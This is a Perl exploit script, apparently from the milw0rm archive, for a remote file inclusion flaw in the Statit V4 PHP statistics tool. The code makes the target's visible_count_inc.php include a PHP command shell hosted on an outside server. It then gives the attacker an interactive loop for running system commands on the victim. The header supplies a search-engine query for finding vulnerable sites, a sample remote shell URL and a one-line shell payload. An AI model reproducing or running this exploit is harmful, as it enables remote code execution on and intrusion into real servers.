#!/usr/bin/perl
##
# Statit V4 Remote File Inclusion exploit
# Bug discovered By IGNOR3
# IGNOR3_llvlle@yahoo.com
# http://www.smart-boys.com
# Google Search=inurl:statit.php
# usage:
# perl statit.pl <target> <cmd shell location> <cmd shell variable>
# perl statit.pl http://target.com/statit/ http://www.golha.net/ignor3/shell.txt cmd
# cmd shell example: <?system($cmd);?>
# cmd shell variable: ($_GET[cmd]);
use LWP::UserAgent;
$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];
if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
head();
while()
{
      print "[shell] \$";
while(<STDIN>)
      {
              $cmd=$_;
              chomp($cmd);
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'visible_count_inc.php?statitpath='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[�]/;
if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
      {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
if($return =~ /(.*)/)
{
      $finreturn = $1;
      $finreturn=~ tr/[�]/[\n]/;
      print "\r\n$finreturn\n\r";
      last;
}
else {print "[shell] \$";}}}last;
sub head()
 {
 print "\n============================================================================\r\n";
 print " Statit V4 Remote File Inclusion exploit\r\n";
 print "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: perl statit.pl <target> <cmd shell location> <cmd shell variable>\r\n\n";
 print " <Site> - Full path to Fastclick ex: http://www.site.com/statit/ \r\n";
 print " <cmd shell> - Path to cmd Shell e.g http://www.golha.net/ignor3/shell.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "                           BUG DISCOVERED BY IGNOR3 \r\n";
 print "                           Yahoo ID: IGNOR3_llvlle \r\n";
 print "                           http://www.smart-boys.com \r\n";
 print "============================================================================\r\n";
 print " Download The Video: http://www.ignor3.persiangig.com/video/statit.rar \r\n";
 print "============================================================================\r\n";
 exit();
 }

# milw0rm.com [2006-05-05]
